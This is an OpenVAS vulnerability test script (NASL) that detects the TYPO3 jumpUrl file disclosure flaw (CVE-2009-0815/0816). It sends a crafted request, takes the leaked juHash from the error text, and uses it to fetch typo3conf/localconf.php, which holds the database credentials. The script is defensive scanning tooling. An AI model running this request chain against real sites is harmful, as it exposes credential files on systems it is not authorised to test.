###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typo3_jumpurl_file_disclosure_vuln.nasl 6769 2017-07-20 09:56:33Z teissa $
#
# TYPO3 jumpUrl File Disclosure Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID = "1.3.6.1.4.1.25623.1.0.803989";
CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6769 $");
  script_cve_id("CVE-2009-0815", "CVE-2009-0816");
  script_bugtraq_id(33714);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
  script_tag(name:"creation_date", value:"2013-12-26 17:48:31 +0530 (Thu, 26 Dec 2013)");
  script_name("TYPO3 jumpUrl File Disclosure Vulnerability");

tag_summary =
"This host is installed with TYPO3 and is prone to multiple vulnerabilities.";

tag_vuldetect =
"Send a Crafted HTTP GET request and check whether it is able to fetch a
remote file.";

tag_insight =
'Multiple error exists in the application,
- An error exist in jumpUrl mechanism, which will disclose a hash secret.
- An error exist in backend user interface, which fails to validate user
supplied input properly.';

tag_impact =
"Successful exploitation will allow remote attackers to steal the
victim's cookie-based authentication credentials or access arbitrary file.

Impact Level: Application";

tag_affected =
"TYPO3 versions 3.3.x, 3.5.x, 3.6.x, 3.7.x, 3.8.x, 4.0 to 4.0.11,
4.1.0 to 4.1.9, 4.2.0 to 4.2.5, 4.3alpha1";

tag_solution =
"Upgrade to TYPO3 version 4.0.12, 4.1.10, 4.2.6 or later, or apply the patch
mentioned in the below link
http://typo3.org/teams/security/security-bulletins/typo3-core/TYPO3-SA-2009-002/";


  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "affected" , value : tag_affected);

  script_xref(name : "URL" , value : "http://www.securitytracker.com/id?1021710");
  script_xref(name : "URL" , value : "http://typo3.org/teams/security/security-bulletins/typo3-core/TYPO3-SA-2009-002/");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_typo3_detect.nasl");
  script_mandatory_keys("TYPO3/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("url_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable initialisation
url = "";
typoPort = "";
typoLoca = "";

## Get Application HTTP Port
if(!typoPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

if(typoLoca = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:typoPort))
{
  url = "/?jumpurl=" + urlencode(str:"typo3conf/localconf.php")+
        "&type=0&juSecure=1&locationData="+ urlencode(str:"2:");

  ## Send and Receive the response
  sndReq = http_get(item:string(typoLoca, url), port:typoPort);
  rcvRes = http_send_recv(port:typoPort, data:sndReq);

  hash = eregmatch(pattern:"jumpurl Secure: Calculated juHash, ([a-z0-9]+), did not match" , string:rcvRes);

  if(hash[1])
  {
    hashURL = url + "&juHash=" + hash[1];

    sndReq = http_get(item:string(typoLoca, hashURL), port:typoPort);
    rcvRes = http_send_recv(port:typoPort, data:sndReq);

    if(rcvRes && rcvRes =~ "HTTP/1.. 200" && "$typo_db" >< rcvRes &&
       "$typo_db_username" >< rcvRes)
    {
      security_message(typoPort);
      exit(0);
    }
  }
}
